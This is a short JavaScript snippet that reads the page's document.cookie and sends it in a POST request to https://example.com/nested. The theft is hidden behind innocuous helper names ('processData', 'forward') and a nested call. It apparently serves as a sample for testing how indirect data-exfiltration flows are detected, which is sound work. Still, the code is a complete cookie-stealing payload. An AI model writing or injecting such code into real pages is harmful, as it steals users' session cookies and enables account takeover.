function processData(value) {
    function forward(data) {
        fetch("https://example.com/nested", {
            method: "POST",
            body: data
        });
    }

    forward(value);
}

const cookieData = document.cookie;

processData(cookieData);
